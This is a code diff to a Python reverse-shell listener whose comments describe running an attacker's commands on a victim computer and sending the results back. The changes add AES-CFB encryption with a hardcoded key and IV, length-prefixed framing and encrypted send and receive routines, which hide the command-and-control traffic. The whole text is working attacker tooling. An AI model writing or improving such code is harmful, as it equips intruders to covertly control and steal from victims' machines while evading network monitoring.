@@ -4,6 +4,10 @@
 # This script will establish the reverse shell connection between attacker and victim machine
 # Commands taken from attacker will be executed through this script on victim computer,
 # then the results will be sent back
+import struct
+import pickle
+
+import Cryptodome.Cipher.AES as AES
 
 # Standard Modules
 import base64
@@ -14,7 +18,6 @@ import json
 import time
 import random
 from queue import Queue
-
 import select
 
 
@@ -37,6 +40,14 @@ class Listener:
     task_queue = Queue()
     socket_queue = Queue()
     receive_queue = Queue()
+
+    iv = b"alZtfBYgrEpOidxu"
+    key = b"wEzDCNvhplrfPTkFt9zUdygZDIVoGC9Z"
+    cipher_encrypt = AES.new(key, AES.MODE_CFB, IV=iv)
+
+    iv = b"alZtfBYgrEpOidxu"
+    key = b"wEzDCNvhplrfPTkFt9zUdygZDIVoGC9Z"
+    cipher_decrypt = AES.new(key, AES.MODE_CFB, IV=iv)
 
     # Create and listen a tcp server socket with given ip and port values.
     def __init__(self):
@@ -129,7 +140,6 @@ class Listener:
                     self.connection_list.append(response[0])
                     self.address_list.append(response[1])
                     print("[+] Got a connection" + str(response[1]))
-
                 else:
                     break
             except Exception as msg:
@@ -179,22 +189,64 @@ class Listener:
     # Send Messages as Json format for data integrity purposes
     # Sending data plainly might cause problems because end of the data stream cannot be known
     def send_data(self, data):
+
+        # # cipher_bytes = self.cipher.encrypt(data)
+        # # encrypted_text = base64.b64encode(cipher_bytes)
+        # json_data = json.dumps(data).encode()
+        # # print(encrypted_text)
+        # self.target.send(json_data)
+
         json_data = json.dumps(data).encode()
-        self.target.send(json_data)
+        encrypted = self.cipher_encrypt.encrypt(json_data)
+        base64coded = base64.b64encode(encrypted)
+        msg = struct.pack('>I', len(base64coded)) + base64coded
+        self.target.sendall(msg)
 
     # Read data in 1024 byte chunks until json file is fully received
     def receive_data(self):
-        json_data = ""
-        while True:
-            try:
-                ready = select.select([self.target], [], [], 5)
-                if ready[0]:
-                    json_data += self.target.recv(1024).decode()
-                else:
-                    break
-                return json.loads(json_data)
-            except ValueError:
-                continue
+
+        ready = select.select([self.target], [], [], 5)
+        if ready[0]:
+            raw_msglen = self.__recvlength(4)
+            if not raw_msglen:
+                return None
+            msglen = struct.unpack('>I', raw_msglen)[0]
+            # Read the message data
+            return self.__recvpayload(msglen)
+        else:
+            return None
+
+        # while True:
+        #     try:
+        #         ready = select.select([self.target], [], [], 5)
+        #         if ready[0]:
+        #             json_data += self.target.recv(1024).decode()
+        #         else:
+        #             break
+        #         return json.loads(json_data)
+        #     except ValueError:
+        #         continue
+
+    def __recvlength(self, msglen):
+        data = bytearray()
+        while len(data) < msglen:
+            packet = self.target.recv(msglen - len(data))
+            if not packet:
+                return None
+            data.extend(packet)
+        return data
+
+    def __recvpayload(self, msglen):
+        data = bytearray()
+        while len(data) < msglen:
+            packet = self.target.recv(msglen - len(data))
+            if not packet:
+                return None
+            data.extend(packet)
+
+        base64decoded = base64.b64decode(data)
+        decrypted_text = self.cipher_decrypt.decrypt(base64decoded)
+        return json.loads(decrypted_text)
 
     # Send commands to be executed on victim machine
     def execute_remotely(self, command):
